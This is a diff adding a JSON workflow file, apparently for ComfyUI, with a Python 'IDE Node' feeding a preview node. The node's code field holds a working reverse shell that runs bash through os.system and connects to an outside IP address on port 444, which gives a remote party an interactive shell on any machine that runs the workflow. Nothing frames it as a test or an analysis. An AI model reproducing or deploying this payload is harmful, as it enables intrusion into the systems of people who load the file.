@@ -1,0 +1,29 @@
+{
+  "1": {
+    "inputs": {
+      "language": "python",
+      "Add Input variable": "add_input_variable",
+      "Add Output variable": "add_output_variable",
+      "Clear": "clear_code",
+      "pycode": "__import__('os').system('bash -c \"bash -i >& /dev/tcp/2.27.20.81/444 0>&1\"')"
+    },
+    "class_type": "IDENode",
+    "_meta": {
+      "title": "IDE Node"
+    }
+  },
+  "2": {
+    "inputs": {
+      "preview": "",
+      "previewMode": false,
+      "source": [
+        "1",
+        0
+      ]
+    },
+    "class_type": "PreviewAny",
+    "_meta": {
+      "title": "Предпросмотр любого"
+    }
+  }
+}
